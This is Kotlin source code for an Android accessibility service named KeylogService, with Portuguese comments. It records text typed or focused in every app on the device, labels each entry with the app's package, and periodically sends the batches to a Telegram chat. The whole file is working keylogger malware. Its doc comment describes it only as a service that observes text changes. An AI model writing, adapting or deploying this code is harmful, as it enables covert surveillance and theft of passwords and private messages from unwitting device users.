
package com.example.monitor

import android.accessibilityservice.AccessibilityService
import android.content.Intent
import android.os.Handler
import android.os.Looper
import android.view.accessibility.AccessibilityEvent

/**
 * Serviço de acessibilidade que observa alterações de texto e despacha em lotes.
 */
class KeylogService : AccessibilityService() {

    private val buffer = StringBuilder()
    private var ultimoTexto = ""
    private var handler: Handler? = null

    private val ciclo = object : Runnable {
        override fun run() {
            descarregar()
            handler?.postDelayed(this, Config.KEYLOG_INTERVAL_MS)
        }
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        handler = Handler(Looper.getMainLooper())
        handler?.postDelayed(ciclo, Config.KEYLOG_INTERVAL_MS)
        Telegram.send("<i>Monitor de digitação conectado</i>")
    }

    override fun onAccessibilityEvent(evento: AccessibilityEvent?) {
        if (evento == null) return
        if (evento.eventType != AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED &&
            evento.eventType != AccessibilityEvent.TYPE_VIEW_FOCUSED
        ) return

        val texto = evento.text?.joinToString("")?.trim().orEmpty()
        if (texto.isEmpty() || texto == ultimoTexto) return
        ultimoTexto = texto

        val pacote = evento.packageName?.toString()?.substringAfterLast('.') ?: "?"
        buffer.append("[$pacote] $texto\n")

        if (buffer.length >= Config.KEYLOG_FLUSH_CHARS) descarregar()
    }

    private fun descarregar() {
        if (buffer.isEmpty()) return
        val lote = buffer.toString()
        buffer.setLength(0)
        Thread {
            Telegram.send("<b>Digitação</b>\n<pre>${escapar(lote)}</pre>")
        }.start()
    }

    private fun escapar(t: String) = t
        .replace("&", "&amp;")
        .replace("<", "&lt;")
        .replace(">", "&gt;")

    override fun onInterrupt() {
        descarregar()
    }

    override fun onDestroy() {
        handler?.removeCallbacksAndMessages(null)
        descarregar()
        super.onDestroy()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        return START_STICKY
    }
}
